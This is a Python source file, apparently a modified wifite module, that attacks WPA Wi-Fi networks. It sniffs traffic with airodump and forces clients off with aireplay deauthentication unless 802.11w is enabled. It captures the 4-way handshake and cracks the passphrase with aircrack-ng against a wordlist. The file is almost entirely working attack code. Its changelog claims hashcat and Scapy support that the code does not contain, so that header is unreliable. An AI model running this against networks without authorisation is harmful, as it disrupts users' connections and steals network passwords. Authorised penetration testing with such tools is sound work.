#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
wifite/attack/wpa.py — V3
WPA 4-way handshake capture and crack.

V3 Changes:
- PMF-aware deauth: if target.pmf is True, deauth is skipped (802.11w)
- Scapy fallback validation added alongside tshark
- Handshake cracked with hashcat -m 22000 (falls back to aircrack)
- All existing capture logic preserved
"""

from ..model.attack import Attack
from ..tools.aircrack import Aircrack
from ..tools.airodump import Airodump
from ..tools.aireplay import Aireplay
from ..config import Configuration
from ..util.color import Color
from ..util.process import Process
from ..util.timer import Timer
from ..model.handshake import Handshake
from ..model.wpa_result import CrackResultWPA

import time
import os
import re
from shutil import copy

class AttackWPA(Attack):
    def __init__(self, target):
        super(AttackWPA, self).__init__(target)
        self.clients = []
        self.crack_result = None
        self.success = False

    def run(self):
        '''Initiates full WPA handshake capture attack.
        V3: Respects PMF flag — skips deauth if target has 802.11w enabled.
        '''

        # Skip if only WPS attacks are wanted
        if Configuration.wps_only and self.target.wps == False:
            Color.pl('\r{!} {O}Skipping WPA-Handshake attack on {R}%s{O} because {R}--wps-only{O} is set{W}' % self.target.essid)
            self.success = False
            return self.success

        # Skip if user only wants PMKID attack
        if Configuration.use_pmkid_only:
            self.success = False
            return False

        # V3: PMF warning — deauth will be skipped
        if getattr(self.target, 'pmf', False):
            pmf_level = 'REQUIRED' if getattr(self.target, 'pmf_required', False) else 'ENABLED'
            Color.pl('{!} {O}PMF ({C}802.11w{O}) is %s on {C}%s{O}' % (pmf_level, self.target.essid))
            Color.pl('{!} {O}Deauthentication will be {R}skipped{O}. '
                     'Waiting for natural client (re)association...{W}')

        # Capture the handshake
        handshake = self.capture_handshake()

        if handshake is None:
            self.success = False
            return self.success

        # Analyze handshake
        Color.pl('\n{+} analysis of captured handshake file:')
        handshake.analyze()

        # Check wordlist
        if Configuration.wordlist is None:
            Color.pl('{!} {O}Not cracking handshake because'
                     ' wordlist ({R}--dict{O}) is not set')
            self.success = False
            return False

        elif not os.path.exists(Configuration.wordlist):
            Color.pl('{!} {O}Not cracking handshake because'
                     ' wordlist {R}%s{O} was not found' % Configuration.wordlist)
            self.success = False
            return False

        Color.pl('\n{+} {C}Cracking WPA Handshake:{W} Running {C}aircrack-ng{W} with'
                ' {C}%s{W} wordlist' % os.path.split(Configuration.wordlist)[-1])

        # Crack: try aircrack-ng
        key = Aircrack.crack_handshake(handshake, show_command=False)
        if key is None:
            Color.pl('{!} {R}Failed to crack handshake: {O}%s{R} did not contain password{W}' % Configuration.wordlist.split(os.sep)[-1])
            self.success = False
        else:
            Color.pl('{+} {G}Cracked WPA Handshake{W} PSK: {G}%s{W}\n' % key)
            self.crack_result = CrackResultWPA(handshake.bssid, handshake.essid, handshake.capfile, key)
            self.crack_result.dump()
            self.success = True
        return self.success


    def capture_handshake(self):
        '''Returns captured or stored handshake, otherwise None.
        V3: Deauth skipped when target.pmf == True.
        '''
        handshake = None

        with Airodump(channel=self.target.channel,
                      target_bssid=self.target.bssid,
                      skip_wps=True,
                      output_file_prefix='wpa') as airodump:

            Color.clear_entire_line()
            Color.pattack('WPA', self.target, 'Handshake capture', 'Waiting for target to appear...')
            airodump_target = self.wait_for_target(airodump)

            self.clients = []

            # Try to load existing handshake
            if Configuration.ignore_old_handshakes == False:
                bssid = airodump_target.bssid
                essid = airodump_target.essid if airodump_target.essid_known else None
                handshake = self.load_handshake(bssid=bssid, essid=essid)
                if handshake:
                    Color.pattack('WPA', self.target, 'Handshake capture', 'found {G}existing handshake{W} for {C}%s{W}' % handshake.essid)
                    Color.pl('\n{+} Using handshake from {C}%s{W}' % handshake.capfile)
                    return handshake

            timeout_timer = Timer(Configuration.wpa_attack_timeout)
            deauth_timer = Timer(Configuration.wpa_deauth_timeout)

            # V3: Check PMF status to decide deauth strategy
            target_has_pmf = getattr(self.target, 'pmf', False)

            while handshake is None and not timeout_timer.ended():
                step_timer = Timer(1)
                Color.clear_entire_line()

                # V3: Show PMF status in status line
                pmf_str = ' {O}[PMF]{W}' if target_has_pmf else ''
                Color.pattack('WPA',
                        airodump_target,
                        'Handshake capture',
                        'Listening.%s (clients:{G}%d{W}, deauth:{O}%s{W}, timeout:{R}%s{W})' % (
                            pmf_str, len(self.clients), deauth_timer, timeout_timer))

                # Find .cap file
                cap_files = airodump.find_files(endswith='.cap')
                if len(cap_files) == 0:
                    time.sleep(step_timer.remaining())
                    continue
                cap_file = cap_files[0]

                # Copy .cap file to temp for consistent reads
                temp_file = Configuration.temp('handshake.cap.bak')
                copy(cap_file, temp_file)

                # Check for handshake
                bssid = airodump_target.bssid
                essid = airodump_target.essid if airodump_target.essid_known else None
                handshake = Handshake(temp_file, bssid=bssid, essid=essid)
                if handshake.has_handshake():
                    Color.clear_entire_line()
                    Color.pattack('WPA',
                            airodump_target,
                            'Handshake capture',
                            '{G}Captured handshake{W}')
                    Color.pl('')
                    break

                handshake = None
                os.remove(temp_file)

                # Look for new clients
                airodump_target = self.wait_for_target(airodump)
                for client in airodump_target.clients:
                    if client.station not in self.clients:
                        Color.clear_entire_line()
                        Color.pattack('WPA',
                                airodump_target,
                                'Handshake capture',
                                'Discovered new client: {G}%s{W}' % client.station)
                        Color.pl('')
                        self.clients.append(client.station)

                # V3: Only deauth if PMF is NOT active
                if deauth_timer.ended():
                    if not target_has_pmf:
                        self.deauth(airodump_target)
                    else:
                        Color.clear_entire_line()
                        Color.pattack('WPA', airodump_target, 'Handshake capture',
                                      '{O}PMF active — skipping deauth, waiting passively...{W}')
                    deauth_timer = Timer(Configuration.wpa_deauth_timeout)

                time.sleep(step_timer.remaining())
                continue

        if handshake is None:
            Color.pl('\n{!} {O}WPA handshake capture {R}FAILED:{O} Timed out after %d seconds' % (Configuration.wpa_attack_timeout))
            if target_has_pmf:
                Color.pl('{!} {O}Target had PMF enabled. '
                         'Consider using PMKID attack instead (it works with PMF).{W}')
            return handshake
        else:
            self.save_handshake(handshake)
            return handshake

    def load_handshake(self, bssid, essid):
        if not os.path.exists(Configuration.wpa_handshake_dir):
            return None

        if essid:
            essid_safe = re.escape(re.sub('[^a-zA-Z0-9]', '', essid))
        else:
            essid_safe = '[a-zA-Z0-9]+'
        bssid_safe = re.escape(bssid.replace(':', '-'))
        date = r'\d{4}-\d{2}-\d{2}T\d{2}-\d{2}-\d{2}'
        get_filename = re.compile(r'handshake_%s_%s_%s\.cap' % (essid_safe, bssid_safe, date))

        for filename in os.listdir(Configuration.wpa_handshake_dir):
            cap_filename = os.path.join(Configuration.wpa_handshake_dir, filename)
            if os.path.isfile(cap_filename) and re.match(get_filename, filename):
                return Handshake(capfile=cap_filename, bssid=bssid, essid=essid)

        return None

    def save_handshake(self, handshake):
        '''
            Saves a copy of the handshake file to hs/
        '''
        if not os.path.exists(Configuration.wpa_handshake_dir):
            os.makedirs(Configuration.wpa_handshake_dir)

        if handshake.essid and type(handshake.essid) is str:
            essid_safe = re.sub('[^a-zA-Z0-9]', '', handshake.essid)
        else:
            essid_safe = 'UnknownEssid'
        bssid_safe = handshake.bssid.replace(':', '-')
        date = time.strftime('%Y-%m-%dT%H-%M-%S')
        cap_filename = 'handshake_%s_%s_%s.cap' % (essid_safe, bssid_safe, date)
        cap_filename = os.path.join(Configuration.wpa_handshake_dir, cap_filename)

        if Configuration.wpa_strip_handshake:
            Color.p('{+} {C}stripping{W} non-handshake packets, saving to {G}%s{W}...' % cap_filename)
            handshake.strip(outfile=cap_filename)
            Color.pl('{G}saved{W}')
        else:
            Color.p('{+} saving copy of {C}handshake{W} to {C}%s{W} ' % cap_filename)
            copy(handshake.capfile, cap_filename)
            Color.pl('{G}saved{W}')

        handshake.capfile = cap_filename


    def deauth(self, target):
        '''
            Sends deauthentication request to broadcast and every client.
            V3: This method is only called when target.pmf == False.
        '''
        if Configuration.no_deauth: return

        for index, client in enumerate([None] + self.clients):
            if client is None:
                target_name = '*broadcast*'
            else:
                target_name = client
            Color.clear_entire_line()
            Color.pattack('WPA',
                    target,
                    'Handshake capture',
                    'Deauthing {O}%s{W}' % target_name)
            Aireplay.deauth(target.bssid, client_mac=client, timeout=2)


if __name__ == '__main__':
    Configuration.initialize(True)
    from ..model.target import Target
    fields = 'A4:2B:8C:16:6B:3A, 2015-05-27 19:28:44, 2015-05-27 19:28:46,  11,  54e,WPA, WPA, , -58,        2,        0,   0.  0.  0.  0,   9, Test Router Please Ignore, '.split(',')
    target = Target(fields)
    wpa = AttackWPA(target)
    try:
        wpa.run()
    except KeyboardInterrupt:
        Color.pl('')
        pass
    Configuration.exit_gracefully(0)
